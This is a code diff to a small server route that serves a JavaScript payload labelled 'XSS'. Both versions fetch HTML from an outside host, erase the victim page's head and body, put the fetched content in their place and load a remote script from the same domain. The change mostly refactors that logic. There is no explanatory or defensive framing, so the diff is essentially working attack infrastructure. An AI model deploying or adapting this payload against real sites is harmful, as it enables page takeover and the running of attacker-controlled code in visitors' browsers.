@@ -34,42 +34,47 @@ serve({
 
     if (url.pathname === "/js" && req.method === "GET") {
       const jsCode = `
-console.log('Evaluating JS string');
-fetch('https://data.estebanmf.space/xss')
-.then(t => t.text())
-.then(d => {
-console.log('Fetched HTML:', d);
-// Use existing <html> element
-const html = document.documentElement;
-// Clear existing <head> and <body>
-const head = document.head || document.querySelector('head');
-const body = document.body || document.querySelector('body');
-while (head.firstChild) {
-head.removeChild(head.firstChild);
-}
-while (body.firstChild) {
-body.removeChild(body.firstChild);
-}
-// Set <title> in <head>
-const title = document.createElement('title');
-title.textContent = 'XSS';
-head.appendChild(title);
-// Parse fetched body content into a temporary container
-const tempDiv = document.createElement('div');
-tempDiv.innerHTML = d; // Temporary use of innerHTML to parse
-const fetchedBody = tempDiv.querySelector('body') || tempDiv;
-// Move body children to existing <body> element
-while (fetchedBody.firstChild) {
-body.appendChild(fetchedBody.firstChild);
-}
-// Create and append script tag for xss-script.js
-const script = document.createElement('script');
-script.src = 'https://data.estebanmf.space/xss-script.js';
-body.appendChild(script);
-console.log('Existing DOM updated and script appended');
-})
-.catch(e => console.error('Fetch error:', e));
-`;
+    console.log('Evaluating JS string');
+    fetch('https://data.estebanmf.space/xss')
+      .then(t => t.text())
+      .then(d => {
+        console.log('Fetched HTML:', d);
+        // Use existing <html> element
+        const html = document.documentElement;
+        const head = document.head || document.querySelector('head');
+        const body = document.body || document.querySelector('body');
+        // Clear existing <head> and <body>
+        while (head.firstChild) {
+          head.removeChild(head.firstChild);
+        }
+        while (body.firstChild) {
+          body.removeChild(body.firstChild);
+        }
+        // Set <title> in <head>
+        const title = document.createElement('title');
+        title.textContent = 'XSS';
+        head.appendChild(title);
+        // Append script to <head>
+        const script = document.createElement('script');
+        script.src = 'https://data.estebanmf.space/xss-script.js';
+        head.appendChild(script);
+        console.log('Script appended to head');
+        // Parse fetched HTML using DOMParser to avoid innerHTML
+        const parser = new DOMParser();
+        const parsedDoc = parser.parseFromString(d, 'text/html');
+        const fetchedBody = parsedDoc.querySelector('body');
+        if (!fetchedBody) {
+          console.error('No body found in fetched HTML');
+          return;
+        }
+        // Move all children from fetched <body> to existing <body>
+        Array.from(fetchedBody.children).forEach(child => {
+          body.appendChild(child);
+        });
+        console.log('Body content appended to existing body');
+      })
+      .catch(e => console.error('Fetch error:', e));
+  `;
       return new Response(jsCode, {
         headers: {
           "Content-Type": "application/javascript",
